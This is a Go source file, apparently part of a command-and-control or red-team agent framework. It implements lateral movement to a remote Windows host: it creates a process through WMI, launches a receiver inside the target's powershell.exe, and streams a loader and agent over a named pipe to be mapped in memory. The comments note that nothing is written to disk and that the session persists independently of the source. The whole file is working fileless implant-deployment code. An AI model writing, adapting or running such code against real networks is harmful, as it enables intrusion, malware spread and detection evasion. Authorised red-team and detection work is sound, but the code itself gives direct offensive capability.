package main

import (
	"errors"
	"fmt"
	"io"
	"os"
	"syscall"
	"time"
)

// wmiLoaderMove deploys the server-staged artifact to the target through
// WMI and a named pipe, with no file staged on the target: the remote
// command starts the receiver inside the target's powershell.exe, the
// source streams the framed loader and agent halves over a kernel pipe, and
// the receiver maps the agent in memory. Unlike the WinRM deployment, the
// created process is independent of this source: the deployed session
// survives this agent and ends at target shutdown or an explicit kill.
func wmiLoaderMove(payload lateralPayload, targetSession string, agent []byte, deadline time.Time) error {
	transfer, err := prepareWinRMTransferFromBytes(agent)
	if err != nil {
		return fmt.Errorf("prepare loader transfer: %w", err)
	}
	transfer.deadline = deadline
	pipeName := wmiLoaderPipeName(targetSession)
	script := wmiLoaderScript(pipeName, targetSession, payload.WorkspaceID, transfer)
	command := buildWindowsCmdLine(append([]string{winrmReceiverCommandPath}, wmiLoaderArguments(script)...))
	if err := wmiCreateProcess(payload.Host, command); err != nil {
		return fmt.Errorf("start loader receiver on %s: %w", payload.Host, err)
	}
	conn, err := dialWmiLoaderPipe(payload.Host, pipeName, deadline)
	if err != nil {
		return err
	}
	defer conn.Close()
	if err := wmiCopyWithDeadline(conn, transfer.source, deadline); err != nil {
		return err
	}
	if err := wmiReadLoaderReply(conn, deadline); err != nil {
		return err
	}
	return nil
}

// dialWmiLoaderPipe connects the remote pipe the receiver created. WMI
// returns as soon as the process is created, so the listener may not exist
// yet: file-not-found and pipe-busy are retried until the deadline, and any
// other error is reported with the stage that failed.
func dialWmiLoaderPipe(host, pipeName string, deadline time.Time) (io.ReadWriteCloser, error) {
	path := `\\` + host + `\pipe\` + pipeName
	for {
		conn, err := os.OpenFile(path, os.O_RDWR, 0)
		if err == nil {
			return conn, nil
		}
		if errno := pathErrno(err); errno == syscall.Errno(2) || errno == syscall.Errno(231) {
			remaining := time.Until(deadline)
			if remaining <= 0 {
				return nil, fmt.Errorf("the loader channel on %s did not open before the deadline", host)
			}
			time.Sleep(min(250*time.Millisecond, remaining))
			continue
		}
		return nil, fmt.Errorf("open loader channel on %s: %w", host, err)
	}
}

// pathErrno extracts a Windows errno from os.OpenFile failures so pipe states
// can be distinguished without a platform-specific dependency.
func pathErrno(err error) syscall.Errno {
	var pathError *os.PathError
	if errors.As(err, &pathError) {
		if errno, ok := pathError.Err.(syscall.Errno); ok {
			return errno
		}
	}
	return 0
}
